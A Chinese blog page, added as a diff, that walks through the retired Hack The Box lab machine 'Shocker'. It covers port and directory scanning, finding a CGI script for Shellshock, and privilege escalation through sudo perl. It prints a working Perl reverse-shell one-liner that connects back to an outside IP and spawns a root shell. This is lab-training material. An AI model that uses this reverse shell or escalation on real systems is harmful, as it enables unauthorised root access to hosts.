@@ -1,0 +1,244 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HTB-Shocker - Lw0F</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lw0F,"> 
+    <meta name="description" content="0x00 前言今天空闲时间又在玩HTB，一个叫Shocker的退役靶机。还是太菜，打不过。在观看IPPSEC大神的视频后，才拓然开朗！！！大神就是叼叼的，在这边安利一波 ：https://youtu,"> 
+    <meta name="author" content="Lw0F"> 
+    <link rel="alternative" href="atom.xml" title="Lw0F" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lw0F</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://Lw0f.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">HTB-Shocker</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">HTB-Shocker</h1>
+        <div class="stuff">
+            <span>二月 03, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天空闲时间又在玩HTB，一个叫Shocker的退役靶机。还是太菜，打不过。在观看IPPSEC大神的视频后，才拓然开朗！！！大神就是叼叼的，在这边安利一波 ：<a target="_blank" rel="noopener" href="https://youtu.be/IBlTdguhgfY">https://youtu.be/IBlTdguhgfY</a></p>
+<h2 id="0x01-探索过程"><a href="#0x01-探索过程" class="headerlink" title="0x01 探索过程"></a>0x01 探索过程</h2><h3 id="端口探索"><a href="#端口探索" class="headerlink" title="端口探索"></a>端口探索</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -T4 -A -v  -sS 10.10.10.56</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br></pre></td></tr></table></figure>
+
+<p>嗯，发现开了80和2222端口</p>
+<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">searchsploit   apache 2.4                                                   130 ⨯</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                      |  Path</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Co | php/remote/29290.c</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execu | php/remote/29316.py</span><br><span class="line">Apache 2.2.4 - 413 Error HTTP Request Method Cross- | unix/remote/30835.sh</span><br><span class="line">Apache 2.4.17 - Denial of Service                   | windows/dos/39037.php</span><br><span class="line">Apache 2.4.17 &lt; 2.4.38 - <span class="string">&#x27;apache2ctl graceful&#x27;</span> <span class="string">&#x27;log | linux/local/46676.php</span></span><br><span class="line"><span class="string">Apache 2.4.23 mod_http2 - Denial of Service         | linux/dos/40909.py</span></span><br><span class="line"><span class="string">Apache 2.4.7 + PHP 7.0.2 - &#x27;</span>openssl_seal()<span class="string">&#x27; Uniniti | php/remote/40142.php</span></span><br><span class="line"><span class="string">Apache 2.4.7 mod_status - Scoreboard Handling Race  | linux/dos/34133.txt</span></span><br><span class="line"><span class="string">Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak    | linux/webapps/42745.py</span></span><br><span class="line"><span class="string">Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service | multiple/dos/26710.txt</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuck.c<span class="string">&#x27; Remot | unix/remote/21671.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/47080.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/764.c</span></span><br><span class="line"><span class="string">Apache OpenMeetings 1.9.x &lt; 3.1.0 - &#x27;</span>.ZIP<span class="string">&#x27; File Dir | linux/webapps/39642.txt</span></span><br><span class="line"><span class="string">Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE | multiple/remote/48410.rb</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>RealPath.jsp<span class="string">&#x27; Informat | multiple/remote/21492.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>Source.jsp<span class="string">&#x27; Informatio | multiple/remote/21490.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root  | multiple/remote/21491.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 5.5.17 - Remote Directory Listing   | multiple/remote/2061.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | multiple/remote/6229.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | unix/remote/14489.c</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | jsp/webapps/42966.py</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | windows/webapps/42953.txt</span></span><br><span class="line"><span class="string">Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Serv | linux/dos/36906.txt</span></span><br><span class="line"><span class="string">Webfroot Shoutbox &lt; 2.32 (Apache) - Local File Incl | linux/remote/34.pl</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Web探索"><a href="#Web探索" class="headerlink" title="Web探索"></a>Web探索</h3><img src="/2021/02/03/HTB-Shocker/1.png" class>
+
+<h4 id="目录扫描："><a href="#目录扫描：" class="headerlink" title="目录扫描："></a>目录扫描：</h4><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56       </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30</span><br><span class="line">Wordlist size: 10832</span><br><span class="line"></span><br><span class="line">Error Log: /home/lw0f/tools/dirsearch/logs/errors-21-02-03_20-50-01.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /home/lw0f/tools/dirsearch/reports/10.10.10.56/_21-02-03_20-50-02.txt</span><br><span class="line"></span><br><span class="line">[20:50:02] Starting: </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.bak1                             </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.orig </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.save</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessBAK</span><br><span class="line">[20:50:11] 403 -  299B  - /.htaccessOLD2          </span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessOLD</span><br><span class="line">[20:50:11] 403 -  301B  - /.htaccess_extra</span><br><span class="line">[20:50:11] 403 -  290B  - /.htm</span><br><span class="line">[20:50:11] 403 -  291B  - /.html</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccess_sc</span><br><span class="line">[20:50:11] 403 -  296B  - /.htpasswds</span><br><span class="line">[20:50:11] 403 -  300B  - /.htpasswd_test</span><br><span class="line">[20:50:11] 403 -  297B  - /.httr-oauth</span><br><span class="line">[20:50:11] 403 -  297B  - /.ht_wsr.txt                         </span><br><span class="line">[20:50:11] 403 -  302B  - /.htaccess.sample                    </span><br><span class="line">[20:50:12] 403 -  300B  - /.htaccess_orig   </span><br><span class="line">[20:50:58] 403 -  294B  - /cgi-bin/                                     </span><br><span class="line">[20:51:17] 200 -  137B  - /index.html                         </span><br><span class="line">[20:51:42] 403 -  300B  - /server-status/                      </span><br><span class="line">[20:51:42] 403 -  299B  - /server-status</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>嗯发现burp也抓不了页面、换了dirbuster也扫不出内容，咋继续？貌似陷入僵局了。。。。。。。</p>
+<p>偷瞄下 ippsec的视频后，发现突破口在/cgi-bin/  ，及扫描姿势，换个gobuster试试 ~</p>
+<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt -t 50 -s200,204,301,302,307,401,403 -x pl,sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.56/cgi-bin/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/dirb/wordlists/small.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     pl,sh</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:23 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/user.sh (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:49 Finished</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找到了 user.sh ,这下应该能抓包了，尝试shellshock试下！！</p>
+<h3 id="突破阶段"><a href="#突破阶段" class="headerlink" title="突破阶段"></a>突破阶段</h3><h4 id="what-a-shellshock！！"><a href="#what-a-shellshock！！" class="headerlink" title="what  a  shellshock！！"></a>what  a  shellshock！！</h4><img src="/2021/02/03/HTB-Shocker/2.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/3.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/4.png" class>
+
+
+
+<h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><h4 id="把哑shell换成tty先"><a href="#把哑shell换成tty先" class="headerlink" title="把哑shell换成tty先"></a>把哑shell换成tty先</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/03/HTB-Shocker/5.png" class>
+
+<h4 id="sudo-l-看下"><a href="#sudo-l-看下" class="headerlink" title="sudo -l 看下"></a>sudo -l 看下</h4><img src="/2021/02/03/HTB-Shocker/6.png" class>
+
+<h4 id="sudo-perl-反连"><a href="#sudo-perl-反连" class="headerlink" title="sudo  perl  反连"></a>sudo  perl  反连</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.33&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/03/HTB-Shocker/7.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/8.png" class>
+
+<p>OR</p>
+<img src="/2021/02/03/HTB-Shocker/9.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/10.png" class>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=29577193'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=28445545'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1072983'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=41630480'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=29577189'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=19563212'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=498661'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%8E%A2%E7%B4%A2%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x01 探索过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.1.</span> <span class="toc-text">端口探索</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#searchsploit"><span class="toc-number">2.1.1.</span> <span class="toc-text">searchsploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%8E%A2%E7%B4%A2"><span class="toc-number">2.2.</span> <span class="toc-text">Web探索</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">目录扫描：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dirsearch"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">dirsearch</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gobuster"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">gobuster</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%98%B6%E6%AE%B5"><span class="toc-number">2.3.</span> <span class="toc-text">突破阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#what-a-shellshock%EF%BC%81%EF%BC%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">what  a  shellshock！！</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">尝试提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%8A%E5%93%91shell%E6%8D%A2%E6%88%90tty%E5%85%88"><span class="toc-number">2.4.1.</span> <span class="toc-text">把哑shell换成tty先</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo-l-%E7%9C%8B%E4%B8%8B"><span class="toc-number">2.4.2.</span> <span class="toc-text">sudo -l 看下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo-perl-%E5%8F%8D%E8%BF%9E"><span class="toc-number">2.4.3.</span> <span class="toc-text">sudo  perl  反连</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
